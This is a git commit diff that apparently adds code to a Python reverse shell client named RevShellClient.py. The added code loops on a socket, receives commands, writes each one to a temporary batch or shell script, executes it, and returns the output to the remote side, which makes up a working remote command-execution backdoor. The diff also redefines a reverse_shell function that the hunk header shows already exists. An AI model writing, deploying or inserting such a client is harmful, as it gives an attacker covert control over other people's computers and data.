221245e4ad3f92e26b0b5202882effe3e8d9ceb1
Bt08s <68190921+Bt08s@users.noreply.github.com>
2023-11-05 09:03:01 +0300

    Update RevShellClient.py

--- RevShellClient.py
+++ RevShellClient.py
@@ -34,4 +34,31 @@ def reverse_shell(client):
             os.remove(file_path)
 
 
+def reverse_shell(client):
+    while True:
+        data = client.recv(1024).decode()
+        if data:
+            if data.strip() == "exit":
+                break
+            output = execute_command(data)
+            client.sendall(output.encode())
+
+
+def execute_command(command):
+    if platform.system() == "Windows":
+        bat_file = "command.bat"
+        with open(bat_file, 'w') as file:
+            file.write(command)
+        output = subprocess.check_output(bat_file, shell=True, text=True)
+        os.remove(bat_file)
+    else:
+        sh_file = "command.sh"
+        with open(sh_file, 'w') as file:
+            file.write("#!/bin/bash\n" + command)
+        os.chmod(sh_file, 0o755)
+        output = subprocess.getoutput(f"./{sh_file}")
+        os.remove(sh_file)
+    return output
+
+
 connect()
